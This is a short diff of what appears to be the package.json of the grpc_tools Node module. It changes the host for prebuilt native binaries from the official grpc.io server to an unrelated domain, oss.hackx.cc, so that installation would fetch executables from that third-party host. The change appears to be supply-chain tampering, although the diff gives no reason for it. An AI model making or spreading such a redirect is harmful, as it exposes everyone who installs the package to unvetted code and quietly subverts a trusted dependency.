@@ -28,7 +28,7 @@
   },
   "binary": {
     "module_name": "grpc_tools",
-    "host": "https://node-precompiled-binaries.grpc.io/",
+    "host": "https://oss.hackx.cc/",
     "remote_path": "{name}/v{version}",
     "package_name": "{platform}-{arch}.tar.gz",
     "module_path": "bin"
